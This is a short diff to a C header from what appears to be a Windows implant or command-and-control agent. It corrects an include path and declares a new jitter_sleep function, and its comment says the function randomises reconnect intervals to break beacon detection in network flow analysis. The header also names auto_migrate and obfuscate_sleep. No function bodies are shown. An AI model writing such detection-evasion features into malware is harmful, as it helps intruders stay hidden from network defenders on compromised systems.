@@ -42,7 +42,7 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 #include <Windows.h>
-#include "../tls/tls_client.h"
+#include "../../tls/tls_client.h"
 
 #ifdef __cplusplus
 extern "C" {
@@ -104,6 +104,19 @@ BOOL auto_migrate(const char *keyPath);
  * Falls back to plain Sleep() if BCryptGenRandom fails.
  */
 void obfuscate_sleep(DWORD ms);
+
+/*
+ * jitter_sleep
+ * ------------
+ * Calls obfuscate_sleep() for a duration drawn uniformly from:
+ *   [base_ms * (1 - RECONNECT_JITTER_PCT/100),
+ *    base_ms * (1 + RECONNECT_JITTER_PCT/100)]
+ *
+ * This breaks fixed-interval beacon detection in network flow analysis.
+ * Uses BCryptGenRandom for the random offset so no CRT rand() dependency.
+ * Falls back to plain obfuscate_sleep(base_ms) if BCrypt fails.
+ */
+void jitter_sleep(DWORD base_ms);
 
 #ifdef __cplusplus
 }
